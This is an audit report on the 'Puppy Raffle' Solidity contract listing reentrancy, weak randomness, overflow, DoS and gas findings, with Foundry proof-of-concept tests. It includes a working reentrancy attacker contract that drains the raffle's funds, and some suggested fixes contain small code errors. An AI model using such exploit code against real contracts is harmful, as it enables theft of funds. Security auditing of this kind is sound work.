<!-- ---
title: Puppy Raffle Audit Report
author: YOUR_NAME_HERE
date: September 1, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
\centering
\begin{figure}[h]
\centering
\includegraphics[width=0.5\textwidth]{logo.pdf}
\end{figure}
\vspace\*{2cm}
{\Huge\bfseries Puppy Raffle Initial Audit Report\par}
\vspace{1cm}
{\Large Version 0.1\par}
\vspace{2cm}
{\Large\itshape Cyfrin.io\par}
\vfill
{\large \today\par}
\end{titlepage}

\maketitle -->

# Puppy Raffle Audit Report

Prepared by: BlockBuddy
Lead Auditors:

- [BlockBuddy](https://github.com/kingmanas)

# Table of contents

<details>

<summary>See table</summary>

- [Puppy Raffle Audit Report](#puppy-raffle-audit-report)
- [Table of contents](#table-of-contents)
- [About BlockBuddy](#about-blockbuddy)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
- [Protocol Summary](#protocol-summary)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings :](#findings-)
- [High](#high)
    - [\[H-1\] External calling to send the refund money through `PuppuRaffle::refund` , opens a Reentrancy Attack](#h-1-external-calling-to-send-the-refund-money-through-puppurafflerefund--opens-a-reentrancy-attack)
    - [\[H-2\] Weak Randomness in `PuppyRaffle::selectWinner` allows user to influence and predict the winner , also can influence the winning puppy](#h-2-weak-randomness-in-puppyraffleselectwinner-allows-user-to-influence-and-predict-the-winner--also-can-influence-the-winning-puppy)
    - [\[H-3\] Overflow of uint64 , `PuppyRaffle::totalFees` is declared as a uint64 , which will overflow after a large number of people have entered the lottery](#h-3-overflow-of-uint64--puppyraffletotalfees-is-declared-as-a-uint64--which-will-overflow-after-a-large-number-of-people-have-entered-the-lottery)
- [Medium](#medium)
    - [\[M-1\] Looping through players array to check for duplicates `PuppyRaffle::enterRaffle` , is a potential Dos attack](#m-1-looping-through-players-array-to-check-for-duplicates-puppyraffleenterraffle--is-a-potential-dos-attack)
    - [\[M-2\] Smart contract wallets raffle winners woithout a `fallback` or `receive` function will block the startr of a new contract.](#m-2-smart-contract-wallets-raffle-winners-woithout-a-fallback-or-receive-function-will-block-the-startr-of-a-new-contract)
- [Low](#low)
    - [\[L-1\] Marks zero for nonentrant users and also for for players at zero index , incorrectly think they have not entered thr raffle](#l-1-marks-zero-for-nonentrant-users-and-also-for-for-players-at-zero-index--incorrectly-think-they-have-not-entered-thr-raffle)
- [Gas](#gas)
    - [\[G-1\] Unchanged State variables should be m,arked constant or immutable](#g-1-unchanged-state-variables-should-be-marked-constant-or-immutable)
    - [\[G-2\] state Variables in a loop should be cached](#g-2-state-variables-in-a-loop-should-be-cached)
    - [\[G-3\] `PuppyRaffle::_isActivePlayer` function is not used anywhere , causing extra gas for nothing](#g-3-puppyraffle_isactiveplayer-function-is-not-used-anywhere--causing-extra-gas-for-nothing)
- [Informational](#informational)
    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\] Missing checks for `address(0)` when assigning values to address state variables](#i-2-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[I-3\] Should name the State Variables better and be more explicit while declaring them..!!](#i-3-should-name-the-state-variables-better-and-be-more-explicit-while-declaring-them)
    - [\[I-4\] `PuppyRaffle::selectWinner` does not follow CEI](#i-4-puppyraffleselectwinner-does-not-follow-cei)
    - [\[I-5\] Use of "magic numbers" is discouraged](#i-5-use-of-magic-numbers-is-discouraged)
    - [\[I-6\] State variables are missing events when updated..!!](#i-6-state-variables-are-missing-events-when-updated)
</details>
</br>

# About BlockBuddy

Hi Everyone..!! I am your BlockBuddy(Buddy for blockchain) , i am from India and very enthusiastic about blockchain and how it is going to change the world for good.I also want to be the contributor for it and spread awareness about blockchain and web3.

# Disclaimer

The BlockBuddy team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

# Audit Details

**The findings described in this document correspond the following commit hash:**

```
22bbbb2c47f3f2b78c1b134590baf41383fd354f
```

## Scope

```
./src/
-- PuppyRaffle.sol
```

# Protocol Summary

Puppy Rafle is a protocol dedicated to raffling off puppy NFTs with variying rarities. A portion of entrance fees go to the winner, and a fee is taken by another address decided by the protocol owner.

## Roles

- Owner: The only one who can change the `feeAddress`, denominated by the `_owner` variable.
- Fee User: The user who takes a cut of raffle entrance fees. Denominated by the `feeAddress` variable.
- Raffle Entrant: Anyone who enters the raffle. Denominated by being in the `players` array.

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 2                      |
| Low      | 1                      |
| Info     | 6                      |
| Gas      | 3                      |
| Total    | 15                     |

# Findings :

# High

### [H-1] External calling to send the refund money through `PuppuRaffle::refund` , opens a Reentrancy Attack

**Discription:** The refund function in our contract diesn't folloe CEI & calls an external call to send the refund money to the respective player and then sets that players index zero. This opens up an Reentrancy attack to happen , as we are updating something after an external call which is not a good practice.

```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

 --->>> payable(msg.sender).sendValue(entranceFee);

-->>        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

**Impact:** It will cause an Reeentracy attack and a attacker can easily just refer this external cal to a malicious contract and take out all the funds from the raffle.

**Proof of Concept:**

<details>
<summary> Reentracy test </summary>

Firstly add a new contract in `PuppyRaffle::PuppyRaffleTest.t.sol`

```javascript
contract ReentrancyAttack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

Then Add this test in `PuppyRaffle::PuppyRaffleTest.t.sol` file as follows:

```javascript
function testRefundHasReentrancy() public  {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttack attackerContract = new ReentrancyAttack(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker , 1 ether);

        uint256 startingAttackBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance", startingAttackBalance);
        console.log("starting contract balance", startingContractBalance);

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending contract balance", address(puppyRaffle).balance);
    }
```

</details>

**Recommended Mitigations:** Follow the CEI method to make the body of the function and arrange Checks , Effects and Interactions accordingly.

```diff
 function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows user to influence and predict the winner , also can influence the winning puppy

**Description** Hashing `msg.sender` , `block.timestamp` and `block.difficulty` together doesn't make a good random number. A attacker may easily manipulate the number and mould it in his benefit to predict the winner of the raffle themselves.

**Impact** Any user can influence the winner and win the puppy for themselves and also the money. Makes the raffle worthless if it becomes a gas war as to who win the raffles.

**Proof of Concept**

1. Validators can know ahead of time the `block.timestamp`
   and know when/how to enter the raffle to predict the winner for themselves.
2. User can also influence the msg.sender value to predict the winner and win all for themselves.

### [H-3] Overflow of uint64 , `PuppyRaffle::totalFees` is declared as a uint64 , which will overflow after a large number of people have entered the lottery

**Discription:** The `PuppyRaffle::selectWinner` function calculates the `totalFees` variable by adding up all the fees that each player has paid. But this will overflow after a large number of people have entered the lottery, as there is no check for an overflow in the `PuppyRaffle::selectWinner` function.

In `PuppyRaffle::selectWinner` function :

```javascript
 uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;

-->>    totalFees = totalFees + uint64(fee);
```

**Impact:**It will cause `totalFees` to overflow and will set it to starting after the max value which will cause in low entrance fee after a certain number of people have entered the Raffle.

**Proof of Concept:**

<details>
<summary> Poc </summary>

Just add this function in `PuppyRaffle::PuppyRaffleTest.t.sol`

```javascript
 function testOverflowOfTotalFees() public {

          address[] memory players1 = new address[](4);
        players1[0] = playerOne;
        players1[1] = playerTwo;
        players1[2] = playerThree;
        players1[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players1);
          vm.warp(block.timestamp + duration + 1);
          puppyRaffle.selectWinner();
          uint256 startingTotalFees = puppyRaffle.totalFees();

        uint256 playersNum = 89;
         address[] memory players = new address[](playersNum);
         for(uint256 i=0; i< playersNum ; i++){
            players[i] = address(i);
         }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum }(players);
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();
        uint256 endingTotalFees = puppyRaffle.totalFees();

        assert(endingTotalFees < startingTotalFees);
        console.log("Starting Total Fee:" , startingTotalFees);
        console.log("Ending Total Fee:" , endingTotalFees);

        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
```

</details>

**Recommended Mitigations:**

1. Newer versions of solidity , bigger units
2. use `safemath` library of openzeppelin

# Medium

### [M-1] Looping through players array to check for duplicates `PuppyRaffle::enterRaffle` , is a potential Dos attack

**Discription:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However the longer the `players` array is , the more time the loop has to iterate. Thus the people who enter the raffle later has to pay more gas than the people who enter it earlier.

```javascript
// @audit Dos
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas cost for raffle entrants will increase and cause the later entrants to be charged more than they should have been. It will cause a rush to enter the raffle at earliest as possible.

An attacker can make the `PuppyRaffle::entrants` array so big, that no one else can enter their name into the entrants array and cause a DoS attack on the raffle.

**Proof of Concept:**

<details>
<summary> PoC </summary>

Put the following code under the `PuppyRaffle::PuppyRaffleTest.t.sol`

```javascript
 function testEnterRaffleForDosAttack() public {
        // vm.expectRevert();
        // for (uint256 i=0;i<playerIn.length;i++){
        // address players = playerIn[i];
        // players[i] = playerIn;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // }

        uint256 playerNum = 100;
        address[] memory entries1 = new address[](playerNum);
        for(uint256 i=0;i<entries1.length;i++){
            entries1[i] = address(i);
        }

        // See how much gas Costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*entries1.length}(entries1);
        uint256 gasEnd = gasleft();



        address[] memory entries2 = new address[](playerNum);
        for(uint256 i=0;i<entries2.length;i++){
            entries2[i] = address(i + playerNum);// to cancel oiut duplicates that have entered before starting from 100 , 101...
        }

        // See how much gas Costs
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*entries2.length}(entries2);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsed1 = gasStart - gasEnd;
        uint256 gasUsed2 = gasStartSecond - gasEndSecond;

        console.log("Gas used for firdst 100 entries",gasUsed1);
        console.log("Gas used for second 100 entries",gasUsed2);

        assert(gasUsed1 < gasUsed2);
    }
```

OutPut :

```javascript
  Gas used for first 100 entries 6252128
  Gas used for second 100 entries 18068211
```

We can clearly see that gas cost becomes so big that it makes impossible for other people to enter and gurantee his win.

</details>

**Recommended Mitigations:** There are few recommendations.

1. Add the following to the code:

```javascript

mapping(address => uint256) public addressToRaffleId;
uint256 public raffleId = 0;

 for(uint256 i =0;i<newPlayers.length;i++){
         require(addressToRaffleId[newPlayers[i]] != raffleId , "Duplicate Player");
     }
In select winner add this first line:
 raffleId += 1

```

2. You can also consider deleting the loop for checking the duplicate addresses as people can easily make new addresses and enter the rafffle with those different addresses. So it might be irrelevant to use this.

### [M-2] Smart contract wallets raffle winners woithout a `fallback` or `receive` function will block the startr of a new contract.

**Discription:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However , if winner is a smart contract wallet that rejects payment then the lottery would not restart.

**Impact:** The `PuppyRaffle::selectWinner` revert many time , making the lottery reset difficult.

**Proof of Concept:**

If 10 smart contract walllets enters the lottery without a fallback or receive function
-->> lottery ends
-->> selectWinner function will not be able to run , even the lottery is over.

**Recommended Mitigations:**

1. Deny the entry of smart contract wallets (not a good thing to do BTW)
2. Create a mapping so that the player can himsself withdraw his prize money.

# Low

### [L-1] Marks zero for nonentrant users and also for for players at zero index , incorrectly think they have not entered thr raffle

**Description** A player at index zero will return 0 , making them not a part of the raffle

```javascript
  function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) { // @audit what if a player is at index 0 , then he will also be marked as inactive.
                return i;
            }
        }
        return 0;
    }
```

**Impact** A user at index 0 will be marked inactive and thus has to reenter in order to participate.

**Recommended Mitigation** The easiest is to revert if player is not in array instead of returning zero.

# Gas

### [G-1] Unchanged State variables should be m,arked constant or immutable

Reading from storage is much more costly than reading from constant or immutable

Instances:

- `PuppyRaffle::raffleDuration` should be immutable
- `PuppyRaffle::commonImageUri` should be constant
- `PuppyRaffle::rareImageUri` should be constant
- `PuppyRaffle::legendaryImageUri` should be constant

### [G-2] state Variables in a loop should be cached

Everytime you are calling `players.length` you are reading from storage , as opposed to memory which is more gas effecient.

```diff
+           uint256 playerLength = players.length
-           for (uint256 i = 0; i < players.length - 1; i++) {
+           for(uint256 i=0 ; i< playerLength ;i++){
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playerslength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
            }
```

### [G-3] `PuppyRaffle::_isActivePlayer` function is not used anywhere , causing extra gas for nothing

-->> Consider removing it.

# Informational

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

  ```solidity
  pragma solidity ^0.7.6;
  ```

### [I-2] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

- Found in src/PuppyRaffle.sol [Line: 66](src/PuppyRaffle.sol#L66)

  ```solidity
          feeAddress = _feeAddress;
  ```

- Found in src/PuppyRaffle.sol [Line: 195](src/PuppyRaffle.sol#L195)

  ```solidity
          feeAddress = newFeeAddress;
  ```

### [I-3] Should name the State Variables better and be more explicit while declaring them..!!

### [I-4] `PuppyRaffle::selectWinner` does not follow CEI

```diff
+       _safeMint(winner, tokenId);
   (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
-       _safeMint(winner, tokenId);
```

### [I-5] Use of "magic numbers" is discouraged

It can be confusing to see number literals in a codebase , and it's much more readable if numbers has a name for themselves.

Examples:

```javascript
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead Use:

```javascript
        uint256 public constant FEE_PERCENTAGE = 20;
        uint256 public POOL_PRECISION = 100;
```

### [I-6] State variables are missing events when updated..!!
